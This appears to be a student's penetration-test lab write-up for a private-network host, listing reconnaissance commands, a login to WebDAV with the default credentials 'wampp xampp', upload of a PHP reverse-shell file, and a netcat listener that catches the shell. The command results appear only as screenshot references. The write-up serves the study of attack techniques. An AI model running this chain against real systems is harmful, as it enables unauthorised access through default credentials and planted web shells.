# Aldruhn - 192.168.2.12
## Andrea Zonnekus 18758119

sudo nmap -sV -sV -O 192.168.2.12 -oN hosts

![](aldruhn_alt/Aspose.Words.88e9d01d-8fdc-4dd7-b552-8d7fcf4e904e.001.png)

sudo gobuster dir -u 192.168.2.12 -w /usr/share/dirb/wordlists/big.txt -o aldruhn\_http -x php,html,txt,xml

![](aldruhn_alt/Aspose.Words.88e9d01d-8fdc-4dd7-b552-8d7fcf4e904e.002.png)

http://192.168.2.12/security/

![](aldruhn_alt/Aspose.Words.88e9d01d-8fdc-4dd7-b552-8d7fcf4e904e.003.png)



sudo nikto --url 192.168.2.12 -o nikto --Format text

![](aldruhn_alt/Aspose.Words.88e9d01d-8fdc-4dd7-b552-8d7fcf4e904e.004.png)

davtest -url 192.168.2.12/webdav/

![](aldruhn_alt/Aspose.Words.88e9d01d-8fdc-4dd7-b552-8d7fcf4e904e.005.png)

default creds – wampp xampp

cadaver <http://192.168.2.12/webdav/>

![](aldruhn_alt/Aspose.Words.88e9d01d-8fdc-4dd7-b552-8d7fcf4e904e.006.png)

put test.txt

![](aldruhn_alt/Aspose.Words.88e9d01d-8fdc-4dd7-b552-8d7fcf4e904e.007.png)

![](aldruhn_alt/Aspose.Words.88e9d01d-8fdc-4dd7-b552-8d7fcf4e904e.008.png)

put ../192.168.2.12/windows\_best\_64x.php

![](aldruhn_alt/Aspose.Words.88e9d01d-8fdc-4dd7-b552-8d7fcf4e904e.009.png)

http://192.168.2.12/webdav/windows\_best\_64x.php

![](aldruhn_alt/Aspose.Words.88e9d01d-8fdc-4dd7-b552-8d7fcf4e904e.010.png)



nc -lvnp 4444

![](aldruhn_alt/Aspose.Words.88e9d01d-8fdc-4dd7-b552-8d7fcf4e904e.011.png)

whoami

![](aldruhn_alt/Aspose.Words.88e9d01d-8fdc-4dd7-b552-8d7fcf4e904e.012.png)
